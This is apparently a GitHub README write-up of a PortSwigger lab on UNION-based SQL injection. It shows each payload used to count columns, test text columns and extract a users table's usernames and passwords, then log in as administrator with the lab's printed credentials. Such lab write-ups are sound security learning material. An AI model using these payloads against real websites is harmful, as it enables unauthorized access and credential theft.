# 🔗 Lab 05: SQL Injection — UNION Attack (Retrieving Data from Other Tables)

> **Lab:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)  
> **Difficulty:** 🟡 Practitioner 
> **Status:** ✅ Solved

---

## 📋 Lab Description

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so we can use a UNION attack to retrieve data from other tables.  

The application has a login function, and the database contains a table called `users` with columns called `username` and `password`.

**Objective:** Retrieve all usernames and passwords, then log in as the `administrator` user.

---

## 🛠️ Tools Used

- **Burp Suite Community Edition** – For intercepting, modifying, and replaying HTTP requests
- **Firefox Browser** – For navigating the lab
- **Kali Linux** – Operating system

---

## 🔍 Step-by-Step Methodology

### Step 1: Identify the Number of Columns

First, I needed to determine how many columns the original query was returning. I used the `UNION SELECT` technique with `NULL` values.

**Payload:**
```sql
' UNION SELECT NULL, NULL--
```

**Result:** The application responded with a `200 OK` and no error, confirming that the original query has **2 columns**.

<img width="1280" height="684" alt="Screenshot 2026-08-31 233754" src="https://github.com/user-attachments/assets/e44cda3a-2fee-4728-8a5d-b0fb7472f8dd" />


---

### Step 2: Determine Which Columns Accept Text Data

Next, I replaced each `NULL` with a string value (`'abc'`) to identify which columns can hold text data.

**Payload (testing first column):**
```sql
' UNION SELECT 'abc', NULL--
```

**Result:** No error – the first column accepts text.

<img width="1280" height="684" alt="Screenshot 2026-08-31 233822" src="https://github.com/user-attachments/assets/c7db6d4c-12ab-4be4-ab6a-bf8237b76962" />


**Payload (testing both columns):**
```sql
' UNION SELECT 'abc', 'xyz'--
```

**Result:** No error – **both columns accept text data**.

<img width="1280" height="684" alt="Screenshot 2026-08-31 233845" src="https://github.com/user-attachments/assets/a87253d6-35d2-4eda-80d4-d046b012da15" />


---

### Step 3: Extract Usernames and Passwords

Since both columns accept text, I crafted a payload to retrieve the `username` and `password` columns from the `users` table.

**Payload:**
```sql
' UNION SELECT username, password FROM users--
```

**Result:** The application returned all user credentials in the response.

<img width="1280" height="684" alt="Screenshot 2026-08-31 233952" src="https://github.com/user-attachments/assets/c8cb0fdf-43f0-40ca-879b-7c3928dc7ae6" />


---

### Step 4: View the Results in Browser

I sent the final payload through the browser to visually confirm the extracted data.

**Credentials Retrieved:**

| Username      | Password                |
|---------------|-------------------------|
| carlos        | thymjdlmy3r4yg0v45he    |
| wiener        | xyqkv4hx3hoh2elnvcdfd   |
| administrator | u4sgjjs6lzimwbrpe2p3    |

<img width="1280" height="684" alt="Screenshot 2026-08-31 234006" src="https://github.com/user-attachments/assets/0153eacb-5e23-41ba-bdb9-76c656c021ab" />


---

### Step 5: Log in as Administrator

Using the extracted credentials, I logged in as the `administrator` user.

- **Username:** `administrator`
- **Password:** `u4sgjjs6lzimwbrpe2p3`

**Result:** Successfully logged in and the lab was marked as solved.

<img width="1280" height="684" alt="Screenshot 2026-08-31 234651" src="https://github.com/user-attachments/assets/7b3ce1f4-b548-455a-9c5e-5052c840d099" />


---

## 📁 Repository Structure

```
.
├── README.md
├── screenshots/
│   ├── 01-union-null-null.png          # Step 1: Column count detection
│   ├── 02-union-abc-null.png           # Step 2a: First column text check
│   ├── 03-union-abc-xyz.png            # Step 2b: Both columns text check
│   ├── 04-extract-credentials.png      # Step 3: Data extraction via Burp
│   ├── 05-browser-results.png          # Step 4: Browser view of results
│   └── 06-solved-admin-login.png       # Step 5: Admin login & lab solved
└── payloads.txt                        # List of all payloads used
```

---

## 📝 Payloads Summary

| Step | Payload | Purpose |
|------|---------|---------|
| 1 | `' UNION SELECT NULL, NULL--` | Determine number of columns |
| 2a | `' UNION SELECT 'abc', NULL--` | Check if 1st column accepts text |
| 2b | `' UNION SELECT 'abc', 'xyz'--` | Check if 2nd column accepts text |
| 3 | `' UNION SELECT username, password FROM users--` | Extract credentials |

---

## 🎯 Key Takeaways

1. **UNION attacks require matching column counts** – Always start with `NULL` values.
2. **Data type compatibility matters** – Use string literals like `'abc'` to test which columns can display text.
3. **Burp Suite Repeater is essential** – It allows rapid iteration of payloads without manually retyping them in the browser.
4. **Always check the raw response** – Sometimes extracted data appears in the HTML source before it renders visibly.

---

## ⚠️ Disclaimer

This repository is for **educational purposes only**. The techniques demonstrated here should only be practiced in authorized environments such as the PortSwigger Web Security Academy. Unauthorized SQL injection testing on systems you do not own or have explicit permission to test is illegal and unethical.

---

## 🔗 References

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)

---
> 📝 **Author:** Saber Hasan Swoyon  
> 📅 **Date Solved:** 2026-08-31
